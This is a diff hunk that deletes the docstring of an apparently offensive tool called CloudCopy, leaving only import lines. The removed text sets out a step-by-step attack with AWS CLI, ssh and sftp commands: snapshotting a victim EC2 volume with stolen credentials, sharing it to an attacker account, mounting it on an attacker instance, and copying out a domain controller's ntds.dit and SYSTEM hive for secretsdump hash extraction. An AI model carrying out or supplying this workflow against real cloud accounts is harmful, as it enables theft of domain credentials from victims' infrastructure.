@@ -1,34 +1,3 @@
-"""
-CloudCopy algorithm
-
-IN:
-    Target AWS Creds: AWS Secret and AWS Access ID
-    Attacker AWS Creds: AWS Secret and AWS Access ID
-    Attacker Key File: Key file for accessing new instance
-    Attacker Account Id: Attacker account id used for sharing target snapshot with your account
-ALGO:
-    1.  Load AWS CLI with Target Creds
-    2.  Run Describe-Instances and show in list to select
-    3.  Run Create-Snapshot on volume from selected instance
-    4.  Run modify-snapshot-attribute on new snapshot to set createVolumePermission to attacker AWS Account
-    5.  Load AWS CLI with Attacker Creds
-    6.  Find current AMI
-            aws ec2 describe-images --owners amazon --filters 'Name=name,Values=amzn2-ami-hvm-2.0.????????-x86_64-gp2'
-            'Name=state,Values=available' --output json | jq -r '.Images | sort_by(.CreationDate) | last(.[]).ImageId'
-    7.  Run run-instance command to create new linux ec2 with our stolen snapshot
-            aws ec2 run-instances --image-id ami-0c6b1d09930fac512 --count 1 --instance-type t2.micro
-            --key-name {AttackerKey} --block-device-mappings '[{"DeviceName":"/dev/sdf","Ebs":{"SnapshotId":"{SNAP_ID}"}}]'
-    8.  Ssh run "sudo mkdir /windows"
-    9.  Ssh run "sudo mount /dev/xvdf1 /windows/"
-    10. Ssh run "sudo cp /windows/Windows/NTDS/ntds.dit /home/ec2-user"
-    11. Ssh run "sudo cp /windows/Windows/System32/config/SYSTEM /home/ec2-user"
-    12. Ssh run "sudo chown ec2-user:ec2-user /home/ec2-user/*"
-    13. SFTP get "/home/ec2-user/SYSTEM ./SYSTEM"
-    14. SFTP get "/home/ec2-user/ntds.dit ./ntds.dit"
-    15. locally run "secretsdump.py -system ./SYSTEM -ntds ./ntds.dit local -outputfile secrets #expects secretsdump to be on path
-OUT:
-    secrets dump output files
-"""
 import argparse
 import sys
 import time
